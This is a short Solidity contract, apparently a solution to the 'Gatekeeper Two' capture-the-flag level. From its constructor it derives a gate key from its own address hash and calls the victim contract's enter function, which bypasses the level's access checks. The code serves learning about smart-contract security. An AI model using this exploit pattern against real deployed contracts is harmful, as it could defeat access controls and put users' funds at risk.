pragma solidity ^0.8.0;

contract GatekeeperTwoHack {
  constructor(address victim) {
    bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
    bytes memory encodedParams = abi.encodeWithSelector(bytes4(keccak256('enter(bytes8)')), gateKey);
    victim.call(encodedParams);
  }
}
